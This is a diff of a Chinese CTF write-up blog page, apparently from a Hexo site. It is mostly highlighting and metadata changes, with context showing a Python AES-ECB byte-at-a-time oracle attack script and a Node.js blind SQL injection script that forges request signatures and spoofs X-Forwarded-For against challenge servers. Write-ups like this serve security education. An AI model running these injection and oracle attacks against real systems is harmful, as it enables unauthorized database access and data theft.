 <h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>协议分级，看到有ftp协议、stmp协议，stmp协议中有一个base64后的图片，提取该图片并解码可以发现一串字符串，经题目提示可知为一个私钥文件，用ocr软件提取后并修改错误补全格式，wireshark中导入即可看到最后的部分解密出一个http封包，内容中可以获得flag。 <img src="http://p7lc13qga.bkt.clouddn.com/out.jpg" alt="私钥图片"> <img src="http://p7lc13qga.bkt.clouddn.com/captrue.PNG" alt="capt"></p>
 <h2 id="安全通信"><a href="#安全通信" class="headerlink" title="安全通信"></a>安全通信</h2><p>利用aes_ecb分组加密的特点，而且generate_hello中的message长度可控，所以可以按位爆破flag. poc:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">mission_key=<span class="string">"2acba569d223cf7d6e48dee88378288a"</span></span><br><span class="line"></span><br><span class="line">begin=<span class="number">24</span></span><br><span class="line"></span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    f=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    f.connect((<span class="string">"116.85.48.103"</span>,<span class="number">5002</span>))</span><br><span class="line">    <span class="keyword">print</span> f.recv(<span class="number">1024</span>)</span><br><span class="line">    f.send(mission_key+<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">print</span> f.recv(<span class="number">1024</span>)</span><br><span class="line">    f.send(<span class="string">'a'</span>*begin+<span class="string">"\n"</span>)</span><br><span class="line">    crypt=f.recv(<span class="number">1024</span>)</span><br><span class="line">    data=f.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> crypt,data,begin,((len(ans)/<span class="number">16</span>)+<span class="number">1</span>)*<span class="number">32</span></span><br><span class="line">    querystring=<span class="string">'&#123;&#125;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(querystring):</span><br><span class="line">        f.send(querystring[i]+ans+<span class="string">"\n"</span>)</span><br><span class="line">        info=f.recv(<span class="number">1024</span>).split()</span><br><span class="line">        <span class="comment">#print querystring[i]</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=info[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#print info,data,-(((len(ans)/32)+1)*32+1),crypt[-((len(ans)/32)+1)*32-1:-1]</span></span><br><span class="line">        <span class="keyword">if</span>(crypt[-((len(ans)/<span class="number">16</span>)+<span class="number">1</span>)*<span class="number">32</span><span class="number">-1</span>:<span class="number">-1</span>]==data):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"mark"</span></span><br><span class="line">            ans=querystring[i]+ans</span><br><span class="line">            <span class="keyword">print</span> ans</span><br><span class="line">            begin=begin+<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data=f.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="comment">#print "[+]"+data</span></span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"================data is &#123;&#125; end a loop"</span>.format(ans)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">mission_key=<span class="string">"2acba569d223cf7d6e48dee88378288a"</span></span><br><span class="line"></span><br><span class="line">begin=<span class="number">24</span></span><br><span class="line"></span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    f.connect((<span class="string">"116.85.48.103"</span>,<span class="number">5002</span>))</span><br><span class="line">    <span class="keyword">print</span> f.recv(<span class="number">1024</span>)</span><br><span class="line">    f.send(mission_key+<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">print</span> f.recv(<span class="number">1024</span>)</span><br><span class="line">    f.send(<span class="string">'a'</span>*begin+<span class="string">"\n"</span>)</span><br><span class="line">    crypt=f.recv(<span class="number">1024</span>)</span><br><span class="line">    data=f.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> crypt,data,begin,((len(ans)/<span class="number">16</span>)+<span class="number">1</span>)*<span class="number">32</span></span><br><span class="line">    querystring=<span class="string">'&#123;&#125;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(querystring):</span><br><span class="line">        f.send(querystring[i]+ans+<span class="string">"\n"</span>)</span><br><span class="line">        info=f.recv(<span class="number">1024</span>).split()</span><br><span class="line">        <span class="comment">#print querystring[i]</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=info[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#print info,data,-(((len(ans)/32)+1)*32+1),crypt[-((len(ans)/32)+1)*32-1:-1]</span></span><br><span class="line">        <span class="keyword">if</span>(crypt[-((len(ans)/<span class="number">16</span>)+<span class="number">1</span>)*<span class="number">32</span><span class="number">-1</span>:<span class="number">-1</span>]==data):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"mark"</span></span><br><span class="line">            ans=querystring[i]+ans</span><br><span class="line">            <span class="keyword">print</span> ans</span><br><span class="line">            begin=begin+<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data=f.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="comment">#print "[+]"+data</span></span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"================data is &#123;&#125; end a loop"</span>.format(ans)</span><br></pre></td></tr></table></figure>
 <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h2><p>盲注，里面的js加密算法懒得看所以直接用nodejs编写盲注脚本，导入网页中引入的math.js用于加密,脚本如下:</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">    <span class="keyword">var</span> querystring=<span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line">    <span class="keyword">var</span> math=<span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line">    <span class="keyword">var</span> cheerio=<span class="built_in">require</span>(<span class="string">"cheerio"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> key=<span class="string">"adrefkfweodfsdpiru"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span>(<span class="params">obj, key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> str0 = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="string">'sign'</span>) &#123;</span><br><span class="line">                str1 = <span class="string">''</span>;</span><br><span class="line">                str1 = i + <span class="string">'='</span> + obj[i];</span><br><span class="line">                str0 += str1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> math(str0 + key)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> request=<span class="function"><span class="keyword">function</span>(<span class="params">options,postData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> data=<span class="string">""</span>;</span><br><span class="line">            <span class="keyword">var</span> req = http.request(options, <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                res.on(<span class="string">"data"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                    data+=chunk.toString();</span><br><span class="line">                &#125;);</span><br><span class="line">                res.on(<span class="string">"end"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="comment">//console.log("data emitted successfully");</span></span><br><span class="line">                    resolve(data);</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="comment">//console.log(res.statusCode);</span></span><br><span class="line">            &#125;);</span><br><span class="line">            req.on(<span class="string">"error"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">                <span class="comment">//console.log(err, message);</span></span><br><span class="line">            &#125;)</span><br><span class="line">    </span><br><span class="line">            req.write(postData);</span><br><span class="line">            req.end();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        ans=<span class="string">''</span>;</span><br><span class="line">        ll=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">128</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;<span class="number">128</span>;j++) &#123;</span><br><span class="line">                <span class="keyword">var</span> obj = &#123;</span><br><span class="line">                    id: <span class="string">''</span>,</span><br><span class="line">                    title: <span class="string">'ctf'</span>,</span><br><span class="line">                    author: <span class="string">"' and ascii(mid((select secvalue from ctf_key1),"</span> + i + <span class="string">",1))-"</span> + j + <span class="string">"#"</span>,</span><br><span class="line">                    date: <span class="string">''</span>,</span><br><span class="line">                    time: <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>)</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">//console.log(obj.author);</span></span><br><span class="line">                <span class="comment">//console.log(obj);</span></span><br><span class="line">                <span class="keyword">var</span> sign = signGenerate(obj, key);</span><br><span class="line">                <span class="keyword">var</span> options = &#123;</span><br><span class="line">                    hostname: <span class="string">'116.85.43.88'</span>,</span><br><span class="line">                    method: <span class="string">'POST'</span>,</span><br><span class="line">                    port: <span class="number">8080</span>,</span><br><span class="line">                    path: <span class="string">'/PEQFGTUTQMZWCZGK/dfe3ia/index.php?'</span> + querystring.stringify(&#123;<span class="string">'sig'</span>: sign, <span class="string">'time'</span>: obj.time&#125;),</span><br><span class="line">                    headers: &#123;</span><br><span class="line">                        <span class="string">'X-Forwarded-For'</span>: <span class="string">'123.232.23.245'</span>,</span><br><span class="line">                        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> data = <span class="keyword">await</span> request(options, querystring.stringify(obj));</span><br><span class="line">                <span class="comment">//console.log(data);break;</span></span><br><span class="line">                <span class="keyword">var</span> $ = cheerio.load(data);</span><br><span class="line">                <span class="keyword">if</span>($(<span class="string">'tr'</span>).length==<span class="number">0</span>)<span class="built_in">console</span>.log(data);</span><br><span class="line">                <span class="comment">//console.log($('tr').length);</span></span><br><span class="line">                <span class="keyword">if</span> ($(<span class="string">'tr'</span>).length == <span class="number">3</span>)&#123; ans = ans + <span class="built_in">String</span>.fromCharCode(j);<span class="keyword">break</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'[+]'</span>+ans);</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">128</span>)<span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    main();</span><br><span class="line"><span class="string">``</span><span class="string">`   </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">其中math.js即为网页中的math.js,最后一行添加：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">    <span class="built_in">module</span>.exports=hex_math_enc;</span><br></pre></td></tr></table></figure>
 <p><img src="http://p7lc13qga.bkt.clouddn.com/web1.png" alt="web1"></p>
@@ -2133,7 +2133,7 @@ print_r(serialize($test));
         DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)
         <span class="keyword">print</span> DIFFICULTY
         i=<span class="number">0</span>
-        <span class="keyword">while</span> <span class="keyword">True</span>:
+        <span class="keyword">while</span> <span class="literal">True</span>:
             transferred = create_tx([], [])
             <span class="comment">#print head </span>
             new_block = create_block(str(head), str(i), [])
@@ -2196,20 +2196,20 @@ deal(sys.argv[<span class="number">1</span>])
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/mysql-functions/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -2264,7 +2264,7 @@ deal(sys.argv[<span class="number">1</span>])
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -2281,7 +2281,7 @@ deal(sys.argv[<span class="number">1</span>])
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
 
                 
                 
@@ -2683,20 +2683,20 @@ YEARWEEK()
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/wmj/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -2751,7 +2751,7 @@ YEARWEEK()
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -2768,7 +2768,7 @@ YEARWEEK()
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
 
                 
                 
@@ -2877,7 +2877,7 @@ YEARWEEK()
 
       <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
             
@@ -2935,9 +2935,7 @@ YEARWEEK()
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -2972,9 +2970,7 @@ YEARWEEK()
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
